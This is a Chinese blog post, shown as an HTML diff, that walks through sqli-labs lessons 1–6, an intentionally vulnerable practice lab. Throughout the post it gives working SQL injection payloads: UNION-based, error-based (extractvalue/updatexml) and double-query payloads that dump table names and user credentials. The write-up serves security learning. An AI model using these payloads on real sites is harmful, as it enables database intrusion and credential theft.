@@ -1,0 +1,844 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="[basic challenges] WP1 WP2les1:GET-Error based-Single quotes-String 看到please input the ID as parameter with numeric value后就GET一个id=1[常规测试]">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sqli-labs-master les1-les6">
+<meta property="og:url" content="https://ocgittt.github.io/2019/07/17/ctfthe-gamesqli-labs-master/index.html">
+<meta property="og:site_name" content="OC的博客">
+<meta property="og:description" content="[basic challenges] WP1 WP2les1:GET-Error based-Single quotes-String 看到please input the ID as parameter with numeric value后就GET一个id=1[常规测试]">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://ocbillhome.files.wordpress.com/2019/07/les1_1.png">
+<meta property="og:image" content="https://ocbillhome.files.wordpress.com/2019/07/getid1.png">
+<meta property="og:image" content="https://ocbillhome.files.wordpress.com/2019/07/getid1-1.png">
+<meta property="og:image" content="https://ocbillhome.files.wordpress.com/2019/07/id1or11.png">
+<meta property="og:image" content="https://ocbillhome.files.wordpress.com/2019/07/orderby3-a.png">
+<meta property="og:image" content="https://ocbillhome.files.wordpress.com/2019/07/orderby4-a.png">
+<meta property="og:image" content="https://ocbillhome.files.wordpress.com/2019/07/unionselect12323.png">
+<meta property="og:image" content="https://ocbillhome.files.wordpress.com/2019/07/dbversion.png">
+<meta property="og:image" content="https://ocbillhome.files.wordpress.com/2019/07/tables.png">
+<meta property="og:image" content="https://ocbillhome.files.wordpress.com/2019/07/xpath.png">
+<meta property="og:image" content="https://ocbillhome.files.wordpress.com/2019/07/columns.png">
+<meta property="og:image" content="https://ocbillhome.files.wordpress.com/2019/07/xpathcolumns.png">
+<meta property="og:image" content="https://ocbillhome.files.wordpress.com/2019/07/usernamepasswd.png">
+<meta property="og:image" content="https://ocbillhome.files.wordpress.com/2019/07/zhi.png">
+<meta property="og:image" content="https://ocbillhome.files.wordpress.com/2019/07/unionselect123.png">
+<meta property="og:image" content="https://ocbillhome.files.wordpress.com/2019/07/tables-1.png">
+<meta property="og:image" content="https://ocbillhome.files.wordpress.com/2019/07/usernamepasswd-1.png">
+<meta property="og:image" content="https://ocbillhome.files.wordpress.com/2019/07/start.png">
+<meta property="og:image" content="https://ocbillhome.files.wordpress.com/2019/07/groupconcattables.png">
+<meta property="og:image" content="https://ocbillhome.files.wordpress.com/2019/07/concatcolumns.png">
+<meta property="og:image" content="https://ocbillhome.files.wordpress.com/2019/07/zhi-1.png">
+<meta property="og:image" content="https://ocbillhome.files.wordpress.com/2019/07/doublequotes.png">
+<meta property="og:image" content="https://ocbillhome.files.wordpress.com/2019/07/id1.png">
+<meta property="og:image" content="https://ocbillhome.files.wordpress.com/2019/07/id1-1.png">
+<meta property="og:image" content="https://ocbillhome.files.wordpress.com/2019/07/selectdatabase-2.png">
+<meta property="og:image" content="https://ocbillhome.files.wordpress.com/2019/07/database-1.png">
+<meta property="og:image" content="https://ocbillhome.files.wordpress.com/2019/07/tables-2.png">
+<meta property="og:image" content="https://ocbillhome.files.wordpress.com/2019/07/columns-1.png">
+<meta property="og:image" content="https://ocbillhome.files.wordpress.com/2019/07/up.png">
+<meta property="og:image" content="https://ocbillhome.files.wordpress.com/2019/07/up1.png">
+<meta property="og:updated_time" content="2019-07-27T03:52:10.661Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="sqli-labs-master les1-les6">
+<meta name="twitter:description" content="[basic challenges] WP1 WP2les1:GET-Error based-Single quotes-String 看到please input the ID as parameter with numeric value后就GET一个id=1[常规测试]">
+<meta name="twitter:image" content="https://ocbillhome.files.wordpress.com/2019/07/les1_1.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://ocgittt.github.io/2019/07/17/ctfthe-gamesqli-labs-master/">
+
+
+
+
+
+  <title>sqli-labs-master les1-les6 | OC的博客</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">OC的博客</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">OC is not Object-C</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://ocgittt.github.io/2019/07/17/ctfthe-gamesqli-labs-master/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="OC">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="OC的博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">sqli-labs-master les1-les6</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-07-17T21:34:27+08:00">
+                2019-07-17
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/sqli-labs/" itemprop="url" rel="index">
+                    <span itemprop="name">sqli-labs</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="basic-challenges-WP1-WP2"><a href="#basic-challenges-WP1-WP2" class="headerlink" title="[basic challenges] WP1 WP2"></a>[basic challenges] <a href="https://bbs.pediy.com/thread-220075.htm" target="_blank" rel="noopener">WP1</a> <a href="https://www.cnblogs.com/peterpan0707007/p/7620048.html" target="_blank" rel="noopener">WP2</a></h2><h3 id="les1-GET-Error-based-Single-quotes-String"><a href="#les1-GET-Error-based-Single-quotes-String" class="headerlink" title="les1:GET-Error based-Single quotes-String"></a>les1:GET-Error based-Single quotes-String</h3><p><img src="https://ocbillhome.files.wordpress.com/2019/07/les1_1.png" alt></p>
+<p>看到please input the ID as parameter with numeric value后就GET一个id=1[常规测试]</p>
+<p><img src="https://ocbillhome.files.wordpress.com/2019/07/getid1.png" alt></p>
+<a id="more"></a>
+
+<p>有回显,则没毛病,再来个id=1’试试[单引号测试]</p>
+<p><img src="https://ocbillhome.files.wordpress.com/2019/07/getid1-1.png" alt></p>
+<p>竟然都不行,且从报错来看,查询语句是 <strong><code>SELECT * FROM users WHERE id=&#39;1&#39;</code> <code>LIMIT 0,1;</code></strong>这种结构的</p>
+<p>(但是MySQL注释有3种写法①#注释[URL上要用%23注释]②– 注释(注释前面有个空格[URL上要写–%20注释])③/<em>注释</em>/[这种要成对出现,注入一般用不上])</p>
+<p>那就试试id=1’ or 1=’1(万能密码之一)</p>
+<p><img src="https://ocbillhome.files.wordpress.com/2019/07/id1or11.png" alt></p>
+<p>有回显…但是这好像没什么卵用,还是用注释的来玩吧</p>
+<p><img src="https://ocbillhome.files.wordpress.com/2019/07/orderby3-a.png" alt></p>
+<p>姿势:?id=1’ order by 3– a或1’ order by 3 %23</p>
+<p><img src="https://ocbillhome.files.wordpress.com/2019/07/orderby4-a.png" alt></p>
+<p>姿势:?id=1’ order by 4– a或1’ order by 4 %23</p>
+<p>3正常而4错误,则表是有3列的</p>
+<p>接下来就要使用union联合查询(法一)</p>
+<p><img src="https://ocbillhome.files.wordpress.com/2019/07/unionselect12323.png" alt></p>
+<p>姿势:?id=0’ union select 1,2,3</p>
+<p>姿势之所以改为id=0而不是继续id=1,是因为id=1或者其他正整数的时候,会有规定的数据取出,查看了dalao的WP发现这是因为在index.php中并没有循环取出数据,因此只要把1改为0或者负数即可.</p>
+<p>由上图可发现只显示出了2,3而1则不知道哪去了…所以我们只能2或3中选一个位置来爆其他信息</p>
+<p><img src="https://ocbillhome.files.wordpress.com/2019/07/dbversion.png" alt></p>
+<p>姿势:?id=0’ union select 1,database(),version() %23</p>
+<p>database():返回当前数据库连接使用的数据库</p>
+<p>version(): 返回当前数据库的版本</p>
+<p><strong>爆表:</strong></p>
+<p><img src="https://ocbillhome.files.wordpress.com/2019/07/tables.png" alt></p>
+<p>姿势:?id=0’ union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() %23</p>
+<p>还有dalao秀了一波报错型注入(法二)?id=1’ and 1=extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))) –+</p>
+<p><img src="https://ocbillhome.files.wordpress.com/2019/07/xpath.png" alt></p>
+<p>姿势:?id=1’ and 1=extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))) –+<br>这id=1好像不怎么影响???</p>
+<p>爆出的表有emails,referers,uagents,users</p>
+<p><strong>爆列(字段):</strong></p>
+<p><img src="https://ocbillhome.files.wordpress.com/2019/07/columns.png" alt></p>
+<p>姿势:?id=0’ union select 1,group_concat(column_name),3 from information_schema.columns where table_name=’users’ %23</p>
+<p><img src="https://ocbillhome.files.wordpress.com/2019/07/xpathcolumns.png" alt></p>
+<p>姿势: ?id=0’ and 1=extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=’users’))) –+</p>
+<p>爆出users表中的列(字段)有id,username和password</p>
+<p>where语句等号后面的值不能纯英文,比如users需要用’users’单引号,或者使用users的十六进制where=0x7573657273</p>
+<p><strong>爆值:</strong></p>
+<p><img src="https://ocbillhome.files.wordpress.com/2019/07/usernamepasswd.png" alt></p>
+<p>姿势:?id=0’ union select 1,concat(username,0x26,password),3 from users %23</p>
+<p><img src="https://ocbillhome.files.wordpress.com/2019/07/zhi.png" alt></p>
+<p>姿势:id=0’ and 1=extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password) from users))) –+</p>
+<p>爆出username和password的值,我用的符号是&amp;,即username&amp;password是一组</p>
+<p>les1[完]</p>
+<h3 id="les2-GET-Error-based-Intiger-based"><a href="#les2-GET-Error-based-Intiger-based" class="headerlink" title="les2:GET-Error based -Intiger based"></a>les2:GET-Error based -Intiger based</h3><p>开头跟les1一样,GET一个id=1,有回显,id=1’同样跟les1错误</p>
+<p>但是id=1’ %23的时候,les1是正常的,les2却是错误</p>
+<p>所以猜测查询语句为 <strong><code>SELECT * FROM users WHERE id=</code> <code>LIMIT 0,1;</code></strong></p>
+<p>因此可以直接union查询试试是不是其他全都跟les1一样?id=1 union select 1,2,3</p>
+<p><img src="https://ocbillhome.files.wordpress.com/2019/07/unionselect123.png" alt></p>
+<p>发现这跟les1一模一样,直接爆表走起</p>
+<p><img src="https://ocbillhome.files.wordpress.com/2019/07/tables-1.png" alt></p>
+<p><img src="https://ocbillhome.files.wordpress.com/2019/07/usernamepasswd-1.png" alt></p>
+<p>以上姿势跟les1差不多,只需去掉单引号’和最后的%23注释符/–+</p>
+<p>les2[完]</p>
+<h3 id="les3-GET-Error-based-Single-quotes-with-twist-String"><a href="#les3-GET-Error-based-Single-quotes-with-twist-String" class="headerlink" title="les3:GET-Error based Single quotes with twist-String"></a>les3:GET-Error based Single quotes with twist-String</h3><p><img src="https://ocbillhome.files.wordpress.com/2019/07/start.png" alt></p>
+<p>常规操作后,猜测语句是这样的: <strong><code>SELECT * FROM users WHERE id=(&#39;1&#39;</code>) <code>LIMIT 0,1;</code></strong></p>
+<p>所以可以构造payload:</p>
+<p>?id=0’)语句 %23</p>
+<p><img src="https://ocbillhome.files.wordpress.com/2019/07/groupconcattables.png" alt></p>
+<p><img src="https://ocbillhome.files.wordpress.com/2019/07/concatcolumns.png" alt></p>
+<p><img src="https://ocbillhome.files.wordpress.com/2019/07/zhi-1.png" alt></p>
+<p>语句跟前两题一样…这题我只想着id=’input’) LIMIT 0,1,没有想到input前面也应该有个(所以我们要用)来闭合,我竟然想用(来闭合后面的,也试过?id=0)(union select 1,2,3或者是?id=0 union select 1,2,3(…这是因为一开始我觉得)是在LIMIT左边所以要这样来闭合…这也是对代码不够熟悉的问题</p>
+<p>les3[完]</p>
+<h3 id="les4-GET-Error-based-Double-Quotes-String"><a href="#les4-GET-Error-based-Double-Quotes-String" class="headerlink" title="les4:GET-Error based Double Quotes-String"></a>les4:GET-Error based Double Quotes-String</h3><p><img src="https://ocbillhome.files.wordpress.com/2019/07/doublequotes.png" alt></p>
+<p>常规操作、单引号操作都正常，回到题目所说的double quotes string，因此来给双引号测试，果然出错，因此猜测语句是这样的: <strong><code>SELECT * FROM users WHERE id=(</code>“input”) <code>LIMIT 0,1;</code></strong></p>
+<p>然后操作跟之前就一样了，<strong>?id=0”) union select 1,2,3%23</strong></p>
+<p>?id=0”)语句 %23</p>
+<p>les4[完]</p>
+<p>les1-les4是union联合查询的题,分别是单引号,无引号,双引号,单引号带括号</p>
+<h3 id="les5-GET-Double-injection-Single-Quotes-String-les4-5WP"><a href="#les5-GET-Double-injection-Single-Quotes-String-les4-5WP" class="headerlink" title="les5:GET-Double injection-Single Quotes-String les4/5WP"></a>les5:GET-Double injection-Single Quotes-String <a href="https://www.jianshu.com/p/b502893dcc81" target="_blank" rel="noopener">les4/5WP</a></h3><p><img src="https://ocbillhome.files.wordpress.com/2019/07/id1.png" alt></p>
+<p>les5开头也是要输入id=数字，就GET一个id=1，然后就如上图所示，跟前4题好像有点不大一样</p>
+<p><img src="https://ocbillhome.files.wordpress.com/2019/07/id1-1.png" alt></p>
+<p>单引号测试，报错，猜测语句为<strong><code>SELECT * FROM users WHERE id=&#39;input</code>‘ <code>LIMIT 0,1;</code></strong></p>
+<p>再看题目：double injection双注入，搜索了一下，有推荐这篇文章：<a href="http://www.2cto.com/article/201303/192718.html?jovova=hvwse3" target="_blank" rel="noopener">详细讲解双查询注入</a></p>
+<p>文章讲到，双注入需要理解以下4个函数：</p>
+<p>①rand()—随机函数—生成一个0到1的随机数</p>
+<p>②floor()—取整函数—取浮点数的整数部分,如2.7123取2</p>
+<p>③count()—汇总(聚合/计数)函数—返回查询对象的总数</p>
+<p>④group by clause—分组语句—按clause对查询结果分组</p>
+<p>select concat((select database()),floor(rand()*2));//如下图所示</p>
+<p><img src="https://ocbillhome.files.wordpress.com/2019/07/selectdatabase-2.png" alt></p>
+<p><strong>数据库:</strong></p>
+<p>?id=0’ union select count(<em>),2,concat(‘</em>‘,(select database()),’<em>‘,floor(rand()</em>2))as a from information_schema.tables group by a %23</p>
+<p><img src="https://ocbillhome.files.wordpress.com/2019/07/database-1.png" alt></p>
+<p>然后打算这样爆表名</p>
+<p>?id=0’ union select count(<em>),2,concat(‘</em>‘,(select group_concat(table_name) from information_schema.tables where table_schema=’security’),’<em>‘,floor(rand()</em>2))as a from information_schema.tables group by a %23</p>
+<p>发现变成了You are in…… 但是有的dalao的WP明明是这样写的,看来还是要尝试其他姿势</p>
+<p>尝试报错型注入: ?id=1’ and 1=extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))) –+ /<em>没错这跟les1的是一样的</em>/</p>
+<p>或者?id=1’ and updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database()),0x7e),1)%23</p>
+<p><img src="https://ocbillhome.files.wordpress.com/2019/07/tables-2.png" alt></p>
+<p>然后爆列?id=1’ and 1=extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=’users’))) –+</p>
+<p><img src="https://ocbillhome.files.wordpress.com/2019/07/columns-1.png" alt></p>
+<p>然后爆值?id=1’ and 1=extractvalue(1,concat(0x7e,(select group_concat(username,0x26,password) from users)))–+</p>
+<p><img src="https://ocbillhome.files.wordpress.com/2019/07/up.png" alt></p>
+<p>再爆值?id=1’ and 1=extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password) from users where username not in (‘Dumb’,’I-kill-you’))))–+</p>
+<p><img src="https://ocbillhome.files.wordpress.com/2019/07/up1.png" alt></p>
+<p>好像也可以按延迟型注入来做…但暂时先按报错型注入来做吧</p>
+<p>les5[完]</p>
+<h3 id="les6-GET-Double-injection-Double-Quotes-String"><a href="#les6-GET-Double-injection-Double-Quotes-String" class="headerlink" title="les6:GET-Double injection-Double Quotes-String"></a>les6:GET-Double injection-Double Quotes-String</h3><p>跟les5差不多,只要把单引号变成双引号</p>
+<p>and 1=extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))) –+</p>
+<p>注意extractvalue,是extract,不是extra…</p>
+<p>les6[完]</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/07/16/ctfbuuctf-e8-ae-b0-e4-ba-8b-e6-9c-ac/" rel="next" title="BUUCTF记事本">
+                <i class="fa fa-chevron-left"></i> BUUCTF记事本
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/07/20/sqli-labs-master-les7/" rel="prev" title="sqli-labs-master les7:GET-dump into outfile-string">
+                sqli-labs-master les7:GET-dump into outfile-string <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">OC</p>
+              <p class="site-description motion-element" itemprop="description">OC的博客</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">13</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                
+                  <span class="site-state-item-count">6</span>
+                  <span class="site-state-item-name">categories</span>
+                
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">1</span>
+                  <span class="site-state-item-name">tags</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/OCgittt" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#basic-challenges-WP1-WP2"><span class="nav-number">1.</span> <span class="nav-text">[basic challenges] WP1 WP2</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#les1-GET-Error-based-Single-quotes-String"><span class="nav-number">1.1.</span> <span class="nav-text">les1:GET-Error based-Single quotes-String</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#les2-GET-Error-based-Intiger-based"><span class="nav-number">1.2.</span> <span class="nav-text">les2:GET-Error based -Intiger based</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#les3-GET-Error-based-Single-quotes-with-twist-String"><span class="nav-number">1.3.</span> <span class="nav-text">les3:GET-Error based Single quotes with twist-String</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#les4-GET-Error-based-Double-Quotes-String"><span class="nav-number">1.4.</span> <span class="nav-text">les4:GET-Error based Double Quotes-String</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#les5-GET-Double-injection-Single-Quotes-String-les4-5WP"><span class="nav-number">1.5.</span> <span class="nav-text">les5:GET-Double injection-Single Quotes-String les4/5WP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#les6-GET-Double-injection-Double-Quotes-String"><span class="nav-number">1.6.</span> <span class="nav-text">les6:GET-Double injection-Double Quotes-String</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">OC</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
